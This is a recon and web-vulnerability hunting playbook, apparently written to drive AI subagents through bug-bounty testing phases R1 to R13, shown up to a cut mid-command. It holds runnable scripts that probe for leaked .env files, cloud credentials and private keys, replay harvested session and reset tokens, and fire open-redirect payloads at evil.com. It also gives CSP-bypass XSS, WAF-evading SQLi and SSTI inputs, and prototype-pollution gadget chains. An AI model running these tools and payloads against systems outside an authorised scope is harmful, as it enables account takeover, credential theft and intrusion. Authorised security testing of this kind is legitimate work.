# Recon Framework — Phase 1 Workflow
## Run in order when starting any new target

> **ALL PHASES MANDATORY:** R1 through R17 are ALL required — never skip any phase. Even if a phase looks N/A (e.g., source maps on a classic ASP app), run it and record the result with reasoning. "N/A" must be evidenced (e.g., checked .map → 404), not assumed. Skipping R6/R7/R11/R13/R14/R15 while running R1-R5/R8-R10 is a methodology violation.
> **TOOL CHECK BEFORE START:** Verify all recon tools are installed (katana, gau, waybackurls, arjun/qsreplace, feroxbuster/ffuf, whatweb, xsstrike, openredirex). If a tool is missing, install it or use a manual equivalent — do NOT skip the phase. Manual equivalents: Arjun → manual param fuzzing; OpenRedirex → manual curl redirect checks; XSStrike → manual XSS payload testing.
> **COMPLETENESS CHECK:** After finishing recon, verify every R-phase has an entry in publicindex.md. Missing phases = rerun them before proceeding to GenPentest phases.

> **FILE STORAGE RULE:** All target files (tokens, cookies, findings, plans, evidence) go inside ~/Targets/<domain>/. Never use /tmp for persistent data.
> **CONSOLIDATION RULE:** After every phase, append findings to ~/Targets/<domain>/Vulnerabilities.md.
> **INTERACTION MODEL:** Subagents A1–A7 are not fire-and-forget. Delegate, review output, iterate until findings are confirmed. Keep the operator updated.
> **RUFLO PARALLEL AGENTS:** For recon tasks that benefit from parallel execution (e.g., simultaneous subdomain + URL + param discovery), use parallel spawn_agent. Default is sequential (A1→A7). parallel spawn_agent only when explicitly requesting parallel.

## ⚠️ Scope Discipline (READ FIRST)
- See [[methodology/recon-workflow|Recon Workflow Rules]] for full scope flow (SCOPEONLY vs WILDCARD, bug-named vs full).
- **A0 Orchestration:** This framework runs via Hacker-Harness subagents + A0 coordinator. A0 monitors progress, escalates blockers, and acts as interactive bridge — pauses on P1/P2 findings, reports to me with options, and relays my decisions back. See recon-plan-template for the full A0 protocol.
- If scope is **URL_ONLY** (e.g., `https://abc.com`): ALL tools restricted to `abc.com` ONLY
- **Dependency chains:** When a specific bug is named (XSS, SQLi, SSRF, etc.), execute the full prerequisite chain — not just the final R step. See [[methodology/recon-workflow|Recon Workflow Rules]] for the full dependency matrix.
  - katana: `-u https://abc.com` (no subdomain discovery)
  - gau: `--subs` flag DISABLED
  - waybackurls: pipe through `grep abc.com`
  - No subfinder, no amass, no crt.sh
- If scope is **WILDCARD** (e.g., `*.abc.com`): Full recon across all subdomains
  - subfinder/amass/crt.sh enabled
  - gau with `--subs`
  - katana without domain restriction
- **Cross-target findings kept separate** — never mix data from different programs
- All output saved to `~/Targets/{{TARGET_NAME}}/recon/` per session

---

## CORE RECON — Run automatically on every new target

### R1: Sensitive File Exposure — .git + .env + credentials
```bash
# Check all common sensitive files — run FIRST as these may leak credentials for later steps
for path in .git/config .env .env.local .env.production .env.development \
            .env.staging .env.test .env.example .env.sample \
            credentials.json secrets.yaml secrets.yml \
            config/master.key database.yml \
            .aws/credentials .gcp/credentials.json \
            .npmrc .dockercfg .dockerconfigjson \
            sftp-config.json .ftpconfig \
            id_rsa id_dsa id_ecdsa deploy_rsa \
            backup.sql dump.sql \
            Dockerfile docker-compose.yml \
            Makefile package.json composer.json \
            composer.lock yarn.lock package-lock.json \
            phpinfo.php info.php test.php \
            .htaccess .htpasswd \
            .svn/entries .DS_Store Thumbs.db \
            sitemap.xml robots.txt /.well-known/security.txt; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
  if [ "$status" != "404" ]; then
    echo "$status → https://target.com/$path"
  fi
done | sort -u | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_sensitive_files.txt
```

**Priority findings:**
- `200` on any .env file → credentials leaked (P1/P2)
- `200` on .git/config → full repo dump possible
- `200` on credentials.json/secrets.yaml → API keys
- `200` on *.pem, *.key → private keys (P1)
- `200` on .aws/credentials → AWS keys

### R2: Web Crawling — katana
```bash
katana -u https://target.com -d 3 -jc -kf -o /home/kali/Targets/targets/TARGET_NAME/recon/target_katana.txt
```
- Discovers hidden endpoints, JS files, API paths
- `-d 3` = depth 3, `-jc` = crawl JS, `-kf` = keep original path fragments
- Extract all unique paths for further testing

### R3: URL Extraction — gau + waybackurls
```bash
gau --subs https://target.com | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt
waybackurls https://target.com | tee -a /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt
```
- Discovers historical endpoints, API routes, parameters
- Wayback machine + AlienVault + CommonCrawl
- Look for: forgotten endpoints, old API versions, debug paths

### R4: Responsive Analysis — gau/wayback Findings
After extracting target_gau.txt and target_wayback.txt, run these checks:

#### 4a: Email Discovery — >5 instances = finding
```bash
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt 2>/dev/null | \
  sort | uniq -c | sort -rn > /home/kali/Targets/targets/TARGET_NAME/recon/GW_emails_raw.txt
# Report if any email appears 5+ times
while read count email; do
  [ "$count" -ge 5 ] && echo "🔴 $email ($count occurrences)" >> /home/kali/Targets/targets/TARGET_NAME/recon/GW_emails.txt
done < /home/kali/Targets/targets/TARGET_NAME/recon/GW_emails_raw.txt
```

#### 4b: Token Discovery — test if still valid
```bash
# Extract tokens from URLs
grep -oP '(token|reset|forgot|subscription|access_token|refresh_token|api_key|secret|auth|jwt|session)=[^&\s]+' \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt 2>/dev/null | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/GW_tokens_raw.txt

# Test each token by visiting the URI it came from
while IFS='=' read -r param token; do
  # Get the original URL containing this token
  url=$(grep -m1 "${param}=${token}" /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt 2>/dev/null)
  [ -z "$url" ] && url=$(grep -m1 "${param}=${token}" /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt 2>/dev/null)
  [ -z "$url" ] && continue
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url" -m 5 2>/dev/null)
  size=$(curl -s -o /dev/null -w "%{size_download}" "$url" -m 5 2>/dev/null)
  # 200 and non-trivial content = potentially still valid
  if [ "$code" = "200" ] && [ "$size" -gt 100 ]; then
    echo "🟢 LIVE: $code ($size B) → $param=$token" >> /home/kali/Targets/targets/TARGET_NAME/recon/GW_live_tokens.txt
  fi
done < /home/kali/Targets/targets/TARGET_NAME/recon/GW_tokens_raw.txt
```

#### 4c: File Discovery — CSV, Excel, PDF, etc.
```bash
grep -oP 'https?://[^"\s]+\.(csv|xlsx?|pdf|docx?|pptx?|zip|tar\.gz|sql|db|sqlite|mdb|accdb|xlsm)' \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt 2>/dev/null | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/GW_files_candidates.txt

# Check if each file is still accessible
while read url; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url" -m 5 2>/dev/null)
  type=$(curl -s -o /dev/null -w "%{content_type}" "$url" -m 5 2>/dev/null)
  size=$(curl -s -o /dev/null -w "%{size_download}" "$url" -m 5 2>/dev/null)
  if [ "$code" = "200" ] && [ "$size" -gt 1000 ]; then
    echo "🔴 ACCESSIBLE: $code | $size B | $type | $url" >> /home/kali/Targets/targets/TARGET_NAME/recon/GW_files.txt
  fi
done < /home/kali/Targets/targets/TARGET_NAME/recon/GW_files_candidates.txt
```

#### 4d: Dotfile Discovery — .env, .git, etc. from URLs
```bash
grep -oP 'https?://[^"\s]*\.(env|git|aws|gcp|npmrc|dockercfg|htaccess|htpasswd|svn|DS_Store|config|key|pem|cert|crt|csr|password|secret|token|credential|sql|dump|backup)[^"\s]*' \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt 2>/dev/null | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/GW_dotfile_candidates.txt

# Check if accessible
while read url; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url" -m 5 2>/dev/null)
  [ "$code" != "404" ] && echo "$code → $url" >> /home/kali/Targets/targets/TARGET_NAME/recon/GW_dotfile.txt
done < /home/kali/Targets/targets/TARGET_NAME/recon/GW_dotfile_candidates.txt
```

### R5: JS Bundle Analysis — getJS + jsluice + data leak hunt
```bash
# Get all JS URLs from crawling
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_katana.txt | grep -E "\.js$" | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_js_urls.txt

# Extract endpoints from JS
getJS --url https://target.com | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_getjs.txt

# Deep JS analysis with jsluice
jsluice urls /home/kali/Targets/targets/TARGET_NAME/recon/target_js_urls.txt 2>/dev/null | tee -a /home/kali/Targets/targets/TARGET_NAME/recon/target_endpoints.txt
jsluice secrets /home/kali/Targets/targets/TARGET_NAME/recon/target_js_urls.txt 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_js_secrets.txt

# LinkFinder for hidden endpoints
python3 /opt/linkfinder/linkfinder.py -i https://target.com/static/js/main.js -o cli | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_linkfinder.txt
```

**Data leak hunting in JS files — check each for:**
```bash
# API keys: patterns like AIza, sk_live_, AKIA, etc.
grep -oP '(?<![A-Za-z0-9])[A-Za-z0-9]{32,45}(?![A-Za-z0-9])' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null

# JWT tokens
grep -Po 'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js

# Password hashes
grep -iE '"password_hash"|"password_salt"|"bcrypt"|"$2[ayb]\$[0-9]{2}\$"' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js

# Hardcoded credentials
grep -iE '"password":"|"secret":"|"api_key":"|"token":"' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js

# PostMessage — cross-origin communication sinks
grep -oP '(postMessage|onmessage|addEventListener\("message")' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_postmessage.txt

# Check each postMessage call for wildcard targetOrigin (*)
grep -B5 -A5 'postMessage' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null | grep -E '"\*"' | grep -c '"*"'
```

**PostMessage vulnerability check:**
```bash
# Find unsafe postMessage calls (targetOrigin = "*")
grep -B5 'postMessage(.*"\*"' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null

# Find message event handlers that don't validate origin
grep -B10 'addEventListener("message"' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null | grep -v 'event\.origin' | head -20
```

**Manual testing for PostMessage:**
```javascript
// Paste in browser console — test if target accepts messages from any origin
window.addEventListener("message", (e) => {
  console.log("Received:", e.data, "from:", e.origin);
});

// Try sending a message to see if the app processes it
targetWindow.postMessage({action: "eval", code: "alert(1)"}, "*");

// If the app's onmessage handler doesn't check e.origin → vulnerability
// Look for: e.data.action, e.data.type, e.data.method in the handler
// Common sinks: innerHTML, eval, fetch, location, postMessage back
```

**React/Next.js state leaks in page HTML:**
```bash
# __NEXT_DATA__ — Next.js full state in <script>
curl -s https://target.com | grep -oP '__NEXT_DATA__[^<]*' | python3 -c "
import json,sys; d=json.loads(sys.stdin.read().split('type=\"application/json\">')[1].split('</script>')[0])
print(json.dumps(d.get('props',{}).get('pageProps',{}), indent=2)[:2000])
"

# __INITIAL_STATE__ — Redux state
curl -s https://target.com | grep -oP '__INITIAL_STATE__[^<]*'

# __PRELOADED_STATE__ — React state
curl -s https://target.com | grep -oP '__PRELOADED_STATE__[^<]*'

# Full user objects in DOM
grep -oP '"users":\[[^\]]*\]' /home/kali/Targets/targets/TARGET_NAME/recon/pages/*.html 2>/dev/null
grep -oP '"email":"[^"]*","password_hash":"[^"]*"' /home/kali/Targets/targets/TARGET_NAME/recon/pages/*.html 2>/dev/null
```

**localStorage leaks (check via browser console):**
```js
// Paste in browser console while on target
console.log(JSON.stringify(localStorage, null, 2))
console.log(JSON.stringify(sessionStorage, null, 2))
// Look for: passwords, tokens, API keys, PII
```

### R6: Source Map Extraction
```bash
# Use getJS with sourcemaps
getJS --url https://target.com --sourcemaps 2>/dev/null | grep "\.map" > /home/kali/Targets/targets/TARGET_NAME/recon/target_sourcemaps.txt

# Download and extract source maps
for map_url in $(cat /home/kali/Targets/targets/TARGET_NAME/recon/target_sourcemaps.txt); do
  curl -s "$map_url" | python3 -c "
import json,sys
d=json.load(sys.stdin)
print('\n'.join(d.get('sources',[])))
" 2>/dev/null
done | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_recovered_sources.txt
```

### R7: Parameter Discovery — Arjun + qsreplace (feeds into GWJSAJQ_urls.txt)
```bash
# Step 1: Build gwjs_endpoints.txt — unique base paths from R3 + R5
# (R3 produces target_gau.txt + target_wayback.txt, R5 appends JS-extracted endpoints)
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt target_wayback.txt 2>/dev/null | \
  grep -oP 'https?://[^?"\s]*' | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/gwjs_endpoints.txt

# Append JS-extracted endpoints
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_endpoints.txt 2>/dev/null >> /home/kali/Targets/targets/TARGET_NAME/recon/gwjs_endpoints.txt
sort -u -o /home/kali/Targets/targets/TARGET_NAME/recon/gwjs_endpoints.txt /home/kali/Targets/targets/TARGET_NAME/recon/gwjs_endpoints.txt

# Step 2: Arjun on top 10 base paths — discovers hidden params
head -10 /home/kali/Targets/targets/TARGET_NAME/recon/gwjs_endpoints.txt | while read url; do
  /tmp/arjun_venv/bin/arjun -u "$url" -t 10 -q 2>/dev/null
done | grep -E "^[a-z]" | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/mined_pendpoint.txt

# Step 3: qsreplace — extract existing params from all sources
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt target_wayback.txt mined_pendpoint.txt 2>/dev/null | \
  qsreplace FUZZ | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_params.txt

# Step 4: Build GWJSAJQ_urls.txt — merged, deduplicated, all URLs with params → feeds R11 (XSStrike)
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt \
    /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt \
    /home/kali/Targets/targets/TARGET_NAME/recon/mined_pendpoint.txt 2>/dev/null | \
  grep -oP 'https?://[^"\s]*\?[^"\s]*' | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/GWJSAJQ_urls.txt

# Step 5: LFI/Path Traversal param extraction — save for E2
grep -oP '(\\?|&)(file|page|path|load|read|include|inc|template|root|dir|document|folder|view|show|local|full|location|pg|abs|name|cat|cmd|action)[=][^&\\s]+' /home/kali/Targets/targets/TARGET_NAME/recon/target_params.txt 2>/dev/null | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt
```
- `sort -u` ensures every URI is tested only once (no duplicates)
- Source: `target_gau.txt` (R3) + `target_wayback.txt` (R3) + `target_katana.txt` (R2) + `target_endpoints.txt` (R5)
- Arjun finds hidden params like `?admin=true`, `?debug=1`, `?source=internal`
- qsreplace extracts existing params for fuzzing
- Combine both: Arjun discovers hidden params, qsreplace gives you the FUZZ-ready list

**LFI/Path Traversal param extraction — save for E2:**
```bash
# Filter all URLs for LFI-prone parameters (file, page, path, load, etc.)
grep -oP '(\?|&)(file|page|path|load|read|include|inc|template|root|dir|document|folder|view|show|local|full|location|pg|abs|name|cat|cmd|action)[=][^&\s]+' /home/kali/Targets/targets/TARGET_NAME/recon/target_params.txt 2>/dev/null | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt

### R8: Technology Fingerprinting — whatweb
```bash
whatweb -a 3 https://target.com --color=never | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_whatweb.txt
```
- Identifies: web server, framework (Rails/Django/React), JS framework (Next.js/Nuxt), WAF, CMS
- Drives hypothesis selection: Rails → check trailing slash, DRF → load drf-pentest-patterns
- If WAF detected (Cloudflare, Cloudfront) → use curl_cffi with impersonation

### R9: Security Headers Check + CSP Bypass
```bash
# Check all security headers
curl -s -I https://target.com | grep -iE "x-frame-options|content-security-policy|strict-transport-security|x-content-type-options|referrer-policy|permissions-policy"

# Extract CSP header specifically
csp=$(curl -s -I https://target.com | grep -i "content-security-policy" | sed 's/.*content-security-policy: //I')
echo "CSP: $csp"
```
- Missing headers → reportable (P4/Low) on some programs
- CSP analysis → find XSS bypass possibilities
- HSTS missing → MITM risk

**CSP bypass — if CSP script-src has whitelisted domains:**
```bash
# Save CSP to file
curl -s -I https://target.com | grep -i "content-security-policy" | sed 's/.*content-security-policy: //I' > /home/kali/Targets/targets/TARGET_NAME/recon/target_csp.txt

# Extract script-src domains
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_csp.txt | grep -oP "script-src[^;]*" | grep -oP "(https?://[a-zA-Z0-9._-]+)" | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_csp_domains.txt

# Check each whitelisted domain against CSPBypass database
echo "=== CSP Bypass Candidates ==="
while read domain; do
  match=$(grep -i "^$domain" /home/kali/Tools/CSPBypass/data.tsv 2>/dev/null)
  if [ -n "$match" ]; then
    payload=$(echo "$match" | cut -f2)
    echo "✅ BYPASS FOUND for: $domain"
    echo "   Payload: $payload"
    echo "   Test: <script src=\"$payload\"></script>"
  fi
done < /home/kali/Targets/targets/TARGET_NAME/recon/target_csp_domains.txt

# If 5+ consecutive CSP errors appear in browser console → try CSP bypass
# Browser console signal: "Refused to load the script because it violates the following Content Security Policy directive..."
# 5+ consecutive errors = CSP is enforced → bypass needed
```

**CSP bypass XSS test payloads:**
```html
<!-- If google-analytics.com is whitelisted in script-src: -->
<script src="https://www.google-analytics.com/analytics.js"></script>

<!-- If ajax.googleapis.com is whitelisted (AngularJS sandbox escape): -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script>
<div ng-app ng-csp><img src=x ng-on-error="alert(1)"></div>

<!-- JSONP callback abuse on any whitelisted domain: -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

**Full CSP bypass database:** `/home/kali/Tools/CSPBypass/csp_domains.json` (2M+ entries)
**Bypass payloads:** `/home/kali/Tools/CSPBypass/data.tsv` (1000+ working payloads)

**Save CSP bypass payloads for R11 XSS testing:**
```bash
# If bypasses were found, save payloads so R11 can use them
if [ -s /home/kali/Targets/targets/TARGET_NAME/recon/target_csp_domains.txt ]; then
  cat /home/kali/Targets/targets/TARGET_NAME/recon/target_csp_domains.txt | while read domain; do
    match=$(grep -i "^$domain" /home/kali/Tools/CSPBypass/data.tsv 2>/dev/null | cut -f2)
    if [ -n "$match" ]; then
      echo "$match" >> /home/kali/Targets/targets/TARGET_NAME/recon/target_csp_bypass_payloads.txt
    fi
  done
  echo "✅ CSP bypass payloads saved → R11 will test with these"
fi
```
- Signal: 5+ consecutive CSP errors in browser console = CSP bypass needed
- R11 auto-detects if `target_csp_bypass_payloads.txt` exists and uses those payloads

### R10: Open Redirect — from gau/wayback + Arjun/qreplace params

#### Step 1: Extract redirect-prone URLs from gau/wayback
```bash
# URLs with =http://, =https://, =//, or =/path/ patterns
grep -oP 'https?://[^"\s]*(redirect|return|next|url|link|href|target|goto|out|view|dest|destination|continue|window|to|path|uri|file|load)[^"\s]*' \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_wayback.txt 2>/dev/null | \
  grep -oP '[^?]+\?[^"\s]*=[^&\s]*(http[s]?:|//|/)[^"\s]*' | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/GW_open_redirect.txt
```

#### Step 2: Extract redirect-prone params from Arjun/qreplace
```bash
grep -oP '[^?]+\?(redirect|return|next|url|link|href|target|goto|out|view|dest|destination|continue|window|to|path|uri|file|load)=[^&\s]+' \
  /home/kali/Targets/targets/TARGET_NAME/recon/target_params.txt 2>/dev/null | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/AQ_redirect.txt
```

#### Step 3: Merge both sources
```bash
cat /home/kali/Targets/targets/TARGET_NAME/recon/GW_open_redirect.txt \
    /home/kali/Targets/targets/TARGET_NAME/recon/AQ_redirect.txt 2>/dev/null | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/P_O_Redirect.txt
```
#### Step 4: Test with OpenRedirex

```bash
# Payload file — common open redirect + weak regex bypasses
cat > /tmp/open_redirect_payloads.txt << 'EOF'
# Standard bypasses
https://evil.com
//evil.com
///evil.com
https:evil.com
\/\/evil.com/
/\/evil.com/
evil.com
@evil.com
https://evil.com%23

# Whitelist subdomain confusion — if regex checks "starts with target.com"
https://target.com.evil.com
https://evil.target.com
https://evil.com/target.com
https://target.com%40evil.com

# Credentials/@ confusion — if regex checks "contains target.com"
https://target.com@evil.com
https://target.com%2f@evil.com
https://target.com%5c@evil.com
https://target.com\@evil.com

# Path/fragment confusion — if regex checks "target.com anywhere in URL"
https://evil.com#target.com
https://evil.com/target.com
https://evil.com?redirect=target.com
//target.com@evil.com

# URL encoding bypasses
https://target.com%2eevil.com
https://target.com%2fevil.com
https://target.com%00@evil.com
https://target.com%0d%0aevil.com

# Protocol manipulation
/%09target.com
/%0dtarget.com
/%0atarget.com
/%09/target.com
..%2f..%2f..%2f..%2ftarget.com
/%5c%5c%5c%5ctarget.com
https://target.com:evil.com
https://evil.com:443@target.com
EOF

# Run OpenRedirex
cat /home/kali/Targets/targets/TARGET_NAME/recon/P_O_Redirect.txt | \
  /home/kali/go/bin/openredirex -p /tmp/open_redirect_payloads.txt -k "FUZZ" -c 50 2>/dev/null | \
  tee /home/kali/Targets/targets/TARGET_NAME/recon/P_O_Redirect_results.txt

# Check for successes
grep -i "SUCCESS\|200\|redirect" /home/kali/Targets/targets/TARGET_NAME/recon/P_O_Redirect_results.txt 2>/dev/null | \
  tee /home/kali/Targets/targets/TARGET_NAME/recon/P_O_Redirect_findings.txt
```

**Finding:** Any SUCCESS in P_O_Redirect_findings.txt = confirmed open redirect

### R11: XSS/SQLi/SSTI/IDOR — XSStrike (on GWJSAJQ_urls.txt)
```bash
# Run on GWJSAJQ_urls.txt — merged URLs with params from all sources
cat /home/kali/Targets/targets/TARGET_NAME/recon/GWJSAJQ_urls.txt | while read url; do
  python3 xsstrike/xsstrike.py -u "$url" --skip-dom --skip-xss --blind 2>/dev/null
done

# If R9 found CSP bypass payloads, use them for XSS testing
if [ -s /home/kali/Targets/targets/TARGET_NAME/recon/target_csp_bypass_payloads.txt ]; then
  echo "=== Testing with CSP bypass payloads from R9 ==="
  while read payload; do
    cat /home/kali/Targets/targets/TARGET_NAME/recon/target_params.txt | while read url; do
      python3 xsstrike/xsstrike.py -u "$url" --skip-dom --skip-xss --data "$payload" 2>/dev/null
    done
  done < /home/kali/Targets/targets/TARGET_NAME/recon/target_csp_bypass_payloads.txt
fi

# Save all potential SQLi endpoints for E1 exploitation
grep -i "potential.*sqli\|sqli.*found\|blind.*sqli\|time.*based" /home/kali/Targets/targets/TARGET_NAME/recon/target_xsstrike_output.txt 2>/dev/null | \
  grep -oP 'https?://[^ "'\''\t]+' > /home/kali/Targets/targets/TARGET_NAME/recon/psqli.txt
```

**General methodology — be responsive, not mechanical:**
- If a tool gets blocked by WAF → do NOT skip the endpoint
- Load the relevant skill and try bypass techniques
- If all bypass attempts fail → still flag as **"Potential [vuln class] — WAF detected, bypass attempts failed"**
- The value is in knowing the injection point exists behind the WAF — future bypass techniques may beat it
- Track: which WAF, which params triggered it, which bypasses were tried

**XSS methodology — be responsive, not mechanical:**
- If XSStrike gets blocked by WAF → do NOT skip the endpoint
- Load hunt-xss skill and try bypass techniques (encoding, event handlers, polyglots, WAF bypasses)
  - Encoding: HTML entities, URL encode, double encode, Unicode, UTF-7
  - Event handlers: onfocus, onmouseover, onload, onerror, onpointerenter
  - Polyglots: `jaVasCript:/*-/*`\x60/*\x60/*'"/*-\x60 /*'/*"/*'/* */`*/(alert(1))
- If all bypass attempts fail → still flag as **"Potential XSS — WAF detected, bypass attempts failed"**
- The value is in knowing there's an injection point behind the WAF — future bypass techniques may beat it

**SQLi methodology — be responsive, not mechanical:**
- If XSStrike gets blocked → load hunt-sqli skill and try bypasses
  - Case variation: `UnIoN sElEcT` instead of `UNION SELECT`
  - Comment injection: `UN/**/ION SEL/**/ECT` to break WAF regex
  - Operator substitution: `aND` → `&&` (URL encoded), `OR` → `||`
- If all fail → flag as **"Potential SQLi — WAF detected, bypass attempts failed"**

**SSTI methodology — be responsive, not mechanical:**
- If blocked → load offensive-ssti skill and try bypasses
  - Different syntaxes: `{{7*7}}` → `${7*7}` → `<%= 7*7 %>` → `#{7*7}`
  - Unicode escapes: `\u007b\u007b7*7\u007d\u007d`
  - Newline injection: `{%\nif 1==1\n%}test{%\nendif\n%}`
- If all fail → flag as **"Potential SSTI — WAF detected, bypass attempts failed"**

**IDOR methodology — be responsive, not mechanical:**
- If direct ID fails → load hunt-idor skill and try bypasses
  - UUID patterns: `/api/users/{uuid}` → `/api/v2/users/{uuid}` (version difference)
  - Hashid patterns: try different formats (base64url, integer → hashid)
  - Parameter pollution: `?user_id=123&user_id=456`
  - Headers: `X-Original-URL`, `X-Rewrite-URL` to bypass path-based authz
- If all fail → flag as **"Potential IDOR — access control gap detected, no bypass found"**

**Local skill references for deeper testing:**
```
# XSS
hunt-xss                    — 174 published XSS findings methodology
offensive-xss               — XSS testing checklist
securityfortech/xss-reflected
securityfortech/xss-stored
securityfortech/dom-xss
securityfortech/csrf
securityfortech/clickjacking

# SQLi
hunt-sqli                   — 12 published SQLi findings methodology
offensive-sqli              — SQLi testing skill

# SSTI
hunt-ssti                   — SSTI across Jinja2, Twig, Freemarker, etc.
offensive-ssti              — SSTI testing skill

# IDOR
hunt-idor                   — 26 published IDOR findings methodology
offensive-idor              — IDOR testing skill
```
Load with: `skill_load` / skill playbook, then apply patterns in HH.

### R12: Client-Side Prototype Pollution (CSPP)
Test for prototype pollution in client-side JavaScript — inject `__proto__` via user-controlled input to poison all JS objects in memory, then exploit via a gadget chain.

**Reference: gadgets for 40+ libs at `/home/kali/Tools/client-side-prototype-pollution/`**
```
pp/        — Query string parsers vulnerable to PP (jQuery, backbone, yui, etc.)
gadgets/   — Known gadget chains: jQuery, lodash, DOMPurify, Google Analytics, reCAPTCHA, Vue.js, etc.
```

**Step 1: Find deep merge methods in JS bundles**
```bash
# Search for known merge patterns in JS
grep -oP '(merge|assign|extend|clone|copy|mergeDeep|defaults|$.extend|_.merge|$.extend|Object\.assign)\s*[=(]' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null | sort -u

# Also check which query string parser the app uses (matches pp/ directory)
grep -oP '(deparam|parseQuery|$.param|qs\.parse|queryString|URLSearchParams)' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null | sort -u
```

**Step 2: Test for prototype pollution via URL params/JSON input**
```bash
# URL-based test
curl -s "https://target.com/page?__proto__[test]=polluted&__proto__.test=polluted" | grep -c "polluted"

# JSON-based test (POST endpoints that accept JSON)
curl -s -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"test":"polluted"},"key":"value"}'
```

**Step 3: Classic CSPP payload to test:**
```
# URL params
?__proto__[polluted]=true
?constructor[prototype][polluted]=true
?__proto__.polluted=true

# JSON body
{"__proto__":{"polluted":true}}
{"constructor":{"prototype":{"polluted":true}}}
```

**Step 4: Identify gadget chain — check `gadgets/` for matching libs**
```bash
# Check if target uses any library with known gadgets
grep -oP '(jquery|lodash|vue|react|dompurify|recaptcha|hcaptcha|knockout|marionette)' /home/kali/Targets/targets/TARGET_NAME/recon/jsbundles/*.js 2>/dev/null | sort -u

# Then open the matching gadget file:
# cat /home/kali/Tools/client-side-prototype-pollution/gadgets/jquery.md
# cat /home/kali/Tools/client-side-prototype-pollution/gadgets/lodash.md
```

**Step 5: Full exploit chain — poison + gadget**
```json
# jQuery gadget example: poison $.globalEval
{"__proto__":{"url":"data:,alert(document.domain)"}}

# If app uses jQuery.extend to merge user input → $.globalEval(url) executes malicious code
# All config objects now inherit poisoned url → XSS
```

### R13: SSRF Testing + Blind XSS OOB — Parameter Discovery + ssrfmap + interachsh
**Note:** LFI-prone params (`file=`, `page=`, `path=`, `load=`, `read=`, `include=`) from `ptLFI.txt` often work for SSRF too.
Same endpoint with `http://` instead of `../../../etc/passwd` → SSRF.
**Step 1: Find SSRF-vulnerable parameters from extracted URLs**
```bash
# Scan all collected URLs for SSRF-prone parameter names
grep -oP '\?[^&\s]*=(url|dest|redirect|uri|path|continue|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|file|load|read|image|img|src|href|action|target)[&\s]' /home/kali/Targets/targets/TARGET_NAME/recon/target_params.txt 2>/dev/null | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params.txt

# Also search gau/wayback/katana output directly
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_gau.txt target_katana.txt target_wayback.txt 2>/dev/null | \
